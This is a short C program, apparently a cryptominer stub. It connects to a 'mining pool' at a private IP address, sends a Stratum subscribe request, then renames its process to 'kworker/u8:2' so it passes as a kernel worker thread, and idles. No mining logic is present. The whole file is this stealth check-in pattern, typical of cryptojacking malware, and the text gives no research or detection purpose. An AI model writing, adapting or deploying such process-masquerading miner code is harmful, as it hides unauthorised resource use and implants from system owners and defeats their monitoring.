#define _POSIX_C_SOURCE 200809L

#include <arpa/inet.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define POOL_HOST "192.168.100.1"
#define POOL_PORT 3333
#define POOL_REQUEST \
    "{\"id\":1,\"method\":\"mining.subscribe\",\"params\":[\"xcrypto/1.0\"]}\n"
#define MASQUERADE_NAME "kworker/u8:2"

int main(void)
{
    struct sockaddr_in pool = {
        .sin_family = AF_INET,
        .sin_port = htons(POOL_PORT),
    };
    int connection = socket(AF_INET, SOCK_STREAM, 0);
    if (connection < 0 || inet_pton(AF_INET, POOL_HOST, &pool.sin_addr) != 1 ||
        connect(connection, (struct sockaddr *)&pool, sizeof(pool)) < 0) {
        perror("XCrypto pool connection");
        return 1;
    }

    char response[256];
    prctl(PR_SET_NAME, MASQUERADE_NAME, 0, 0, 0);
    if (dprintf(connection, POOL_REQUEST) < 0 ||
        read(connection, response, sizeof(response)) <= 0)
        return 1;
    for (;;)
        pause();
}
